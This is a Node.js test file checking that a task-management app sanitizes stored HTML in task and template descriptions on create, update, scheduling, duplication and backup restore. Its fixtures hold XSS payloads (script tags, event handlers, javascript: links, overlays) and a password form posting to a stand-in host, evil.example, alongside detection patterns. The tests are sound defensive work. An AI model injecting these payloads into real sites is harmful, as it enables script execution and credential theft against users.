import assert from "node:assert/strict";
import crypto from "node:crypto";
import { mkdtemp, rm } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { after, before, test } from "node:test";
import AdmZip from "adm-zip";

if (!process.env.TEST_DATABASE_URL) throw new Error("Set TEST_DATABASE_URL to a migrated, disposable PostgreSQL database");
process.env.DATABASE_URL = process.env.TEST_DATABASE_URL;
process.env.NODE_ENV = "test";
process.env.LOG_LEVEL = "error";
process.env.JWT_SECRET = "description-sanitizing-secret";
process.env.COOKIE_SECRET = "description-sanitizing-cookie";
const storageDir = await mkdtemp(path.join(os.tmpdir(), "werkyn-description-sanitizing-"));
process.env.STORAGE_DIR = storageDir;
const { buildApp } = await import("../../src/app.js");
const { signAccessToken } = await import("../../src/utils/tokens.js");
const { processRecurringTasks } = await import("../../src/schedulers/recurring-tasks.js");

// Stored HTML that the task create/update path reduces to text: page-wide CSS,
// script, event handlers, javascript: links and an open modal dialog.
const MALICIOUS = [
  "<p>Visible text</p>",
  "<style>#root{outline:9px solid red}</style>",
  "<svg><style>body{display:none}</style></svg>",
  "<script>alert(1)</script>",
  '<img src="x" onerror="alert(2)">',
  '<a href="javascript:alert(3)" onclick="alert(4)">bad link</a>',
  '<p onmouseover="alert(5)" style="position:fixed;inset:0">overlay</p>',
  '<dialog open id="injected">modal</dialog>',
  '<form action="https://evil.example/collect"><input name="password"></form>',
].join("");
const FORBIDDEN = [/<style/i, /<script/i, /<svg/i, /<img/i, /<dialog/i, /<form/i, /<input/i, /\son\w+=/i, /javascript:/i, /style=/i, /#root/];
// Formatting the description editor produces; the task path keeps it unchanged.
const LEGITIMATE = [
  "<h2>Plan</h2>",
  "<p><strong>bold</strong> <em>italic</em> <b>b</b> <i>i</i> <code>x &lt; y &amp;&amp; z</code><br />next</p>",
  "<ul><li>one</li><li>two</li></ul><ol><li>first</li></ol>",
  "<blockquote><p>quoted</p></blockquote><pre><code>const a = 1;</code></pre>",
  '<p><a href="https://example.com/doc?a=1&amp;b=2" target="_blank" rel="noopener noreferrer">link</a> ',
  '<a href="mailto:team@example.com">mail</a></p>',
].join("");

let app, workspace, project, status;
const users = {}, tokens = {}, events = [], expected = {};
let requests = 0;
const suffix = crypto.randomUUID().slice(0, 12);

function request(actor, method, url, payload, headers = {}) {
  return app.inject({ method, url, payload,
    headers: { authorization: `Bearer ${tokens[actor]}`, ...headers },
    remoteAddress: `10.41.${Math.floor(++requests / 250)}.${requests % 250 + 1}`,
  });
}

function assertSanitized(stored, input, where) {
  assert.equal(stored, expected[input], `${where}: stored description differs from the task path`);
  if (input === MALICIOUS) for (const pattern of FORBIDDEN) assert.doesNotMatch(stored, pattern, where);
}

async function legacyTemplate(description, name) {
  // Rows written before template descriptions were sanitized.
  return app.prisma.taskTemplate.create({ data: { projectId: project.id, name, title: `${name} ${suffix}`, description } });
}

before(async () => {
  app = await buildApp(); await app.ready();
  app.broadcast = (...args) => events.push(args);
  for (const [actor, role] of [["ADMIN", "ADMIN"], ["MEMBER", "MEMBER"]]) {
    const user = await app.prisma.user.create({ data: { email: `description-${actor}-${suffix}@example.test`, displayName: actor, emailVerified: true } });
    users[actor] = { ...user, role }; tokens[actor] = signAccessToken({ sub: user.id, email: user.email });
  }
  workspace = await app.prisma.workspace.create({ data: { name: "Descriptions", slug: `descriptions-${suffix}`, members: { create: Object.values(users).map((u) => ({ userId: u.id, role: u.role })) } } });
  project = await app.prisma.project.create({ data: { workspaceId: workspace.id, name: `Descriptions ${suffix}`, members: { create: [{ userId: users.MEMBER.id }] } } });
  status = await app.prisma.statusColumn.create({ data: { projectId: project.id, name: "Open" } });
  // Reference output: what ordinary task creation stores for each input.
  for (const input of [MALICIOUS, LEGITIMATE]) {
    const created = await request("MEMBER", "POST", `/api/projects/${project.id}/tasks`, { title: `Reference ${suffix}`, statusId: status.id, description: input });
    assert.equal(created.statusCode, 201, created.body);
    expected[input] = (await app.prisma.task.findUniqueOrThrow({ where: { id: created.json().data.id } })).description;
  }
  assert.equal(expected[LEGITIMATE], LEGITIMATE, "task path must keep editor formatting unchanged");
  assert.equal(expected[MALICIOUS], "<p>Visible text</p><a>bad link</a><p>overlay</p>modal");
});

after(async () => {
  try {
    if (app && workspace) {
      await app.prisma.task.deleteMany({ where: { project: { workspaceId: workspace.id } } });
      await app.prisma.workspace.deleteMany({ where: { id: workspace.id } });
      await app.prisma.user.deleteMany({ where: { id: { in: Object.values(users).map((u) => u.id) } } });
    }
  } finally { await app?.close(); await rm(storageDir, { recursive: true, force: true }); }
});

test("template create and update store the same sanitized description as the task path", async () => {
  for (const input of [MALICIOUS, LEGITIMATE]) {
    const created = await request("MEMBER", "POST", `/api/projects/${project.id}/templates`, { name: `Create ${suffix}`, title: "From create", description: input });
    assert.equal(created.statusCode, 201, created.body);
    const id = created.json().data.id;
    assertSanitized(created.json().data.description, input, "create response");
    assertSanitized((await app.prisma.taskTemplate.findUniqueOrThrow({ where: { id } })).description, input, "created template row");

    const other = input === MALICIOUS ? LEGITIMATE : MALICIOUS;
    const updated = await request("MEMBER", "PATCH", `/api/projects/${project.id}/templates/${id}`, { description: other });
    assert.equal(updated.statusCode, 200, updated.body);
    assertSanitized(updated.json().data.description, other, "update response");
    assertSanitized((await app.prisma.taskTemplate.findUniqueOrThrow({ where: { id } })).description, other, "updated template row");
  }
  const cleared = await request("MEMBER", "POST", `/api/projects/${project.id}/templates`, { name: `Empty ${suffix}`, title: "No description" });
  assert.equal(cleared.statusCode, 201, cleared.body);
  assert.equal(cleared.json().data.description, null);
  const nulled = await request("MEMBER", "PATCH", `/api/projects/${project.id}/templates/${cleared.json().data.id}`, { description: null });
  assert.equal(nulled.statusCode, 200, nulled.body);
  assert.equal(nulled.json().data.description, null);
});

test("creating a task from a template sanitizes legacy template HTML", async () => {
  for (const input of [MALICIOUS, LEGITIMATE]) {
    const template = await legacyTemplate(input, "Instantiate");
    const created = await request("MEMBER", "POST", `/api/projects/${project.id}/templates/${template.id}/create-task`, {});
    assert.equal(created.statusCode, 201, created.body);
    assertSanitized(created.json().data.description, input, "instantiate response");
    assertSanitized((await app.prisma.task.findUniqueOrThrow({ where: { id: created.json().data.id } })).description, input, "instantiated task row");
  }
});

test("recurring tasks created by the scheduler sanitize legacy template HTML", async () => {
  const today = new Date().toISOString().slice(0, 10);
  for (const input of [MALICIOUS, LEGITIMATE]) {
    const template = await legacyTemplate(input, `Recurring ${input === MALICIOUS ? "malicious" : "legitimate"}`);
    const config = await request("ADMIN", "POST", `/api/projects/${project.id}/recurring`, { templateId: template.id, frequency: "DAILY", startDate: today });
    assert.equal(config.statusCode, 201, config.body);
    await app.prisma.recurringTaskConfig.update({ where: { id: config.json().data.id }, data: { nextRunDate: today } });
  }
  events.length = 0;
  await processRecurringTasks(app.prisma, app);
  assert.equal(events.filter(([projectId, event]) => projectId === project.id && event === "task_created").length, 2);
  for (const [input, label] of [[MALICIOUS, "malicious"], [LEGITIMATE, "legitimate"]]) {
    const tasks = await app.prisma.task.findMany({ where: { projectId: project.id, title: `Recurring ${label} ${suffix}` } });
    assert.equal(tasks.length, 1);
    assertSanitized(tasks[0].description, input, `recurring ${label} task row`);
  }
});

test("duplicating a task sanitizes legacy task HTML", async () => {
  for (const input of [MALICIOUS, LEGITIMATE]) {
    const legacy = await app.prisma.task.create({ data: { projectId: project.id, statusId: status.id, title: `Legacy ${suffix}`, description: input, position: 100 } });
    const copy = await request("ADMIN", "POST", `/api/tasks/${legacy.id}/duplicate`);
    assert.equal(copy.statusCode, 201, copy.body);
    assertSanitized((await app.prisma.task.findUniqueOrThrow({ where: { id: copy.json().data.id } })).description, input, "duplicated task row");
  }
});

test("backup restore sanitizes task descriptions from the backup file", async () => {
  const source = await app.prisma.project.create({ data: { workspaceId: workspace.id, name: `Backup source ${suffix}` } });
  const sourceStatus = await app.prisma.statusColumn.create({ data: { projectId: source.id, name: "Open" } });
  const titles = { [MALICIOUS]: `Backup malicious ${suffix}`, [LEGITIMATE]: `Backup legitimate ${suffix}` };
  for (const input of [MALICIOUS, LEGITIMATE]) {
    await app.prisma.task.create({ data: { projectId: source.id, statusId: sourceStatus.id, title: titles[input], description: input } });
  }
  const exported = await request("ADMIN", "POST", `/api/workspaces/${workspace.id}/backup/export`, { projects: [{ projectId: source.id }], includeFiles: false });
  assert.equal(exported.statusCode, 200, exported.body);
  const backupJson = new AdmZip(exported.rawPayload).getEntry("backup.json").getData();
  // The backup carries the stored HTML as-is; restore is where it is written back.
  assert.ok(backupJson.toString().includes(JSON.stringify(MALICIOUS).slice(1, -1)));

  const boundary = `restore-${crypto.randomUUID()}`;
  const payload = Buffer.concat([
    Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="backup.json"\r\nContent-Type: application/json\r\n\r\n`),
    backupJson,
    Buffer.from(`\r\n--${boundary}--\r\n`),
  ]);
  const restored = await request("ADMIN", "POST", `/api/workspaces/${workspace.id}/backup/restore`, payload, { "content-type": `multipart/form-data; boundary=${boundary}` });
  assert.equal(restored.statusCode, 200, restored.body);
  for (const input of [MALICIOUS, LEGITIMATE]) {
    const tasks = await app.prisma.task.findMany({ where: { title: titles[input], projectId: { not: source.id }, project: { workspaceId: workspace.id } } });
    assert.equal(tasks.length, 1);
    assertSanitized(tasks[0].description, input, "restored task row");
  }
});
